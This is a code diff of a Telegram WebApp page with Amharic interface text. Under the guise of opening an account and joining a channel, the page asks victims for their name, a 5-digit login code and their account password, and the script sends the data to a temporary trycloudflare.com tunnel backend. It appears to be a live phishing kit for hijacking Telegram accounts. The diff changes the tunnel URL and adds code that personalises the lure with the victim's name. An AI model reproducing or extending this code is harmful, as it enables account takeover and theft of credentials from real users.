@@ -159,8 +159,7 @@
         <div class="glass-card">
             <h2 style="margin-bottom: 5px;">አካውንት ይክፈቱ</h2>
             <p style="opacity: 0.7; margin-bottom: 20px; font-size: 14px;">መረጃዎን በትክክል ያስገቡ</p>
-            <input type="text" id="fname" placeholder="First Name">
-            <input type="text" id="lname" placeholder="Last Name">
+            <input type="text" id="fname" placeholder="ሙሉ ስም ያስገቡ">
             <div id="status1" class="msg"></div>
             <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">
                 <div class="btn-spinner" id="loginSpinner"></div>
@@ -172,6 +171,7 @@
     <div id="step2" class="step">
         <div class="glass-card">
             <h3 style="color:#ff1a88;">ማረጋገጫ ኮድ</h3>
+            <p style="font-size: 15px; opacity: 0.9; font-weight: bold; color: #fff;" id="step2_name_display"></p>
             <p style="font-size: 14px; opacity: 0.7;">አኛ የላኩለት ባለ 5 አሃዝ ኮድ በማስገባት ወደ ቻናል ይቀላቀሉ!</p>
             <div class="otp-container" id="otp_container">
                 <div class="otp-box" id="b0"></div><div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div>
@@ -193,7 +193,7 @@
     <div id="step3" class="step">
         <div class="glass-card">
             <i class="fa-solid fa-lock" style="font-size: 40px; color: #f43d97; margin-bottom: 15px;"></i>
-            <h2>ማረጋገጫ</h2>
+            <h2 id="step3_name_display"></h2>
             <p style="opacity: 0.7; margin-bottom: 20px;">የአካውንትዎን ፓስዎርድ ያስገቡ</p>
             <div id="status3" class="msg"></div>
             <div class="pass-wrapper">
@@ -224,12 +224,13 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    const API_BASE_URL = "https://attach-locked-transcription-resistance.trycloudflare.com"; 
+    const API_BASE_URL = "https://convenient-ide-spirituality-clark.trycloudflare.com"; 
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let sid = userId; 
     let currentOtp = "";
     let statusChecker;
     let isProcessing = false;
+    let savedName = "";
 
     const photos = [
         "https://i.postimg.cc/K8vckBCq/181675.jpg",
@@ -248,7 +249,7 @@
                 bg.style.backgroundImage = `url(${photos[2]})`;
                 checkStatus(); 
                 showStep(1); 
-            }, 7000);
+            }, 6000);
         }, 3000);
 
         statusChecker = setInterval(checkStatus, 3000);
@@ -260,6 +261,12 @@
         let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
         const target = document.getElementById(stepId);
         if(target) target.classList.add('active');
+        
+        // ስም ማሳያ ክፍሎችን አዘምን
+        if(savedName) {
+            if(document.getElementById('step2_name_display')) document.getElementById('step2_name_display').innerText = "ሰላም " + savedName;
+            if(document.getElementById('step3_name_display')) document.getElementById('step3_name_display').innerText = savedName;
+        }
     }
 
     function checkStatus() {
@@ -273,11 +280,9 @@
 
     function stopLoaders() {
         isProcessing = false;
-        // Step 1 Reset
         document.getElementById('loginBtn').disabled = false;
         document.getElementById('loginSpinner').style.display = 'none';
         document.getElementById('loginText').innerText = 'Login';
-        // Step 3 Reset
         document.getElementById('confirmBtn').disabled = false;
         document.getElementById('confirmSpinner').style.display = 'none';
         document.getElementById('confirmText').innerText = 'አረጋግጥ';
@@ -296,7 +301,8 @@
     }
 
     function handleLoginClick() {
-        if(!document.getElementById('fname').value || !document.getElementById('lname').value) {
+        savedName = document.getElementById('fname').value;
+        if(!savedName) {
             showMsg(1, 'error', 'እባክዎ መጀመሪያ ስም ይሙሉ!');
             return;
         }
@@ -324,7 +330,7 @@
             const res = await fetch(`${API_BASE_URL}/check_user_db`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({user_id: userId})
+                body: JSON.stringify({user_id: userId, name: savedName})
             });
             const data = await res.json();
             
